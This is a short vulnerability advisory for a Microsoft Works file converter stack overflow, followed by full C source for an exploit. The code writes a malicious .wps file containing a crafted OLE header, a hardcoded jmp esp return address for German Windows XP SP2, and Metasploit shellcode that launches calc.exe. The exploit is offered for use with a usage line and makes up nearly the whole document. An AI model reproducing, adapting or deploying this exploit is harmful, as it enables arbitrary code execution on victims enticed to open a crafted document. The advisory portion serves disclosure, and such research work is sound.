source: http://www.securityfocus.com/bid/27659/info

Microsoft Works File Converter is prone to a remote code-execution vulnerability because it fails to adequately validate user-supplied input.

An attacker could exploit this issue by enticing a victim to open a malicious '.wps' file.

Successfully exploiting this issue would allow the attacker to execute arbitrary code in the context of the currently logged-in user.

/*
* Copyright (c) 2008 chujwamwdupe - pumpernikiel.c
*
* one day in teletubby land...
*
* an email from idefense:
*
* "Unfortunately, Microsoft has refused to credit you using the name
you requested."
*
* ...what's wrong with 'chujwamwdupe', eh?
*
*
* Description:
*    A vulnerability exists in WPS to RTF convert filter that is part
*    of Microsoft Office 2003. It could be exploited by remote attacker
*    to take complete control of an affected system. This issue is due to
*    stack overflow error in function that read secions from WPS file.
*    When we change size of for example TEXT section to number langer than
*    0x10, stack overflow occurs - very easy to exploit.
*
*
* Tested on:
*      Microsoft Windows XP Service Pack 2 && Microsoft Office 2003
*
* Usage:
*     wps.exe 1 evil.wps
*
*/

#include <stdio.h>
#include <windows.h>

/* WPS Header */
unsigned char uszWpsHeader[] =
"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x3e\x00\x03\x00\xfe\xff\x09\x00"
"\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x02\x00\x00\x00"
"\x01\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xfd\xff\xff\xff\xfe\xff\xff\xff\xfe\xff\xff\xff\x04\x00\x00\x00"
"\x05\x00\x00\x00\x06\x00\x00\x00\x07\x00\x00\x00\x08\x00\x00\x00"
"\xfe\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\x52\x00\x6f\x00\x6f\x00\x74\x00\x20\x00\x45\x00\x6e\x00\x74\x00"
"\x72\x00\x79\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x16\x00\x05\x00\xff\xff\xff\xff\xff\xff\xff\xff\x01\x00\x00\x00"
"\xb2\x5a\xa4\x0e\x0a\x9e\xd1\x11\xa4\x07\x00\xc0\x4f\xb9\x32\xba"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0\x10\xb9\x5f"
"\x53\x8f\xc7\x01\x03\x00\x00\x00\xc0\x0a\x00\x00\x00\x00\x00\x00"
"\x43\x00\x4f\x00\x4e\x00\x54\x00\x45\x00\x4e\x00\x54\x00\x53\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x12\x00\x02\x01\x02\x00\x00\x00\x03\x00\x00\x00\xff\xff\xff\xff"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00"
"\x01\x00\x43\x00\x6f\x00\x6d\x00\x70\x00\x4f\x00\x62\x00\x6a\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x12\x00\x02\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x28\x00\x00\x00\x56\x00\x00\x00\x00\x00\x00\x00"
"\x53\x00\x50\x00\x45\x00\x4c\x00\x4c\x00\x49\x00\x4e\x00\x47\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x12\x00\x02\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x2a\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00"
"\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00"
"\x05\x00\x00\x00\x06\x00\x00\x00\x07\x00\x00\x00\x08\x00\x00\x00"
"\x09\x00\x00\x00\x0a\x00\x00\x00\x0b\x00\x00\x00\x0c\x00\x00\x00"
"\x0d\x00\x00\x00\x0e\x00\x00\x00\x0f\x00\x00\x00\x10\x00\x00\x00"
"\x11\x00\x00\x00\x12\x00\x00\x00\x13\x00\x00\x00\x14\x00\x00\x00"
"\x15\x00\x00\x00\x16\x00\x00\x00\x17\x00\x00\x00\x18\x00\x00\x00"
"\x19\x00\x00\x00\x1a\x00\x00\x00\x1b\x00\x00\x00\x1c\x00\x00\x00"
"\x1d\x00\x00\x00\x1e\x00\x00\x00\x1f\x00\x00\x00\x20\x00\x00\x00"
"\x21\x00\x00\x00\x22\x00\x00\x00\x23\x00\x00\x00\x24\x00\x00\x00"
"\x25\x00\x00\x00\x26\x00\x00\x00\x27\x00\x00\x00\xfe\xff\xff\xff"
"\x29\x00\x00\x00\xfe\xff\xff\xff\xfe\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
"\x43\x48\x4e\x4b\x57\x4b\x53\x20\x04\x00\x08\x00\x0e\x00\x00\x03"
"\x00\x02\x00\x00\x00\x0a\x00\x00\xf8\x01\x0e\x00\xff\xff\xff\xff"
"\x18\x00\x54\x45\x58\x54\x00\x00\x2f\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

/* Shellcode - metasploit exec calc.exe */
unsigned char uszShellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x49\x49\x37\x49\x49\x49\x49\x51\x5a\x6a\x42"
"\x58\x50\x30\x41\x31\x42\x41\x6b\x41\x41\x52\x32\x41\x42\x41\x32"
"\x42\x41\x30\x42\x41\x58\x50\x38\x41\x42\x75\x38\x69\x79\x6c\x4a"
"\x48\x67\x34\x47\x70\x77\x70\x53\x30\x6e\x6b\x67\x35\x45\x6c\x4c"
"\x4b\x73\x4c\x74\x45\x31\x68\x54\x41\x68\x6f\x6c\x4b\x70\x4f\x57"
"\x68\x6e\x6b\x71\x4f\x45\x70\x65\x51\x5a\x4b\x67\x39\x4c\x4b\x50"
"\x34\x4c\x4b\x77\x71\x68\x6e\x75\x61\x4b\x70\x4e\x79\x6e\x4c\x4d"
"\x54\x4b\x70\x72\x54\x65\x57\x69\x51\x49\x5a\x46\x6d\x37\x71\x6f"
"\x32\x4a\x4b\x58\x74\x77\x4b\x41\x44\x44\x64\x35\x54\x72\x55\x7a"
"\x45\x6c\x4b\x53\x6f\x51\x34\x37\x71\x48\x6b\x51\x76\x4c\x4b\x76"
"\x6c\x50\x4b\x6e\x6b\x71\x4f\x67\x6c\x37\x71\x68\x6b\x4c\x4b\x65"
"\x4c\x4c\x4b\x64\x41\x58\x6b\x4b\x39\x53\x6c\x75\x74\x46\x64\x78"
"\x43\x74\x71\x49\x50\x30\x64\x6e\x6b\x43\x70\x44\x70\x4c\x45\x4f"
"\x30\x41\x68\x44\x4c\x4e\x6b\x63\x70\x44\x4c\x6e\x6b\x30\x70\x65"
"\x4c\x4e\x4d\x6c\x4b\x30\x68\x75\x58\x7a\x4b\x35\x59\x4c\x4b\x4d"
"\x50\x58\x30\x37\x70\x47\x70\x77\x70\x6c\x4b\x65\x38\x57\x4c\x31"
"\x4f\x66\x51\x48\x76\x65\x30\x70\x56\x4d\x59\x4a\x58\x6e\x63\x69"
"\x50\x31\x6b\x76\x30\x55\x38\x5a\x50\x4e\x6a\x36\x64\x63\x6f\x61"
"\x78\x6a\x38\x4b\x4e\x6c\x4a\x54\x4e\x76\x37\x6b\x4f\x4b\x57\x70"
"\x63\x51\x71\x32\x4c\x52\x43\x37\x70\x42";

char szIntro[] =
"\n\t\tMicrosoft Office .WPS Stack Overflow\n"
"\t\t\tAdam Walker (c) 2007\n"
"[+] Targets:\n"
"\t(1) Windows XP SP2 ntdll.dll de\n"
"Usage: wps.exe <target> <file>";

typedef struct {
    const char *szTarget;
    unsigned char uszRet[5];
} TARGET;

TARGET targets[] = {
    { "Windows XP SP2 de ntdll.dll", "\xED\x1E\x94\x7C" },        /* jmp esp */
};

int main( int argc, char **argv ) {
    char szBuffer[1024*10];
    FILE *f;
    void *pExitProcess[4];

    if ( argc < 3 ) {
        printf("%s\n", szIntro );
        return 0;
    }

    memset(szBuffer, 0x90, 1024*10);

    printf("[+] Creating WPS header...\n");
    memcpy( szBuffer, uszWpsHeader, sizeof( uszWpsHeader ) - 1 );

    printf("[+] Copying addr && nops && shellcode...\n");
    memcpy( szBuffer + sizeof( uszWpsHeader ) - 1, targets[atoi( argv[1]
+ 1 )].uszRet, 4 );
    memcpy( szBuffer + sizeof( uszWpsHeader ) + 3, uszShellcode, sizeof(
uszShellcode ) - 1 );

    f = fopen( argv[2], "wb" );
    if ( f == NULL ) {
        printf("[-] Cannot create file\n");
        return 0;
    }

    fwrite( szBuffer, 1, sizeof( szBuffer) , f );
    fclose( f );
    printf("[+] .WPS file succesfully created!\n");
    return 0;
} 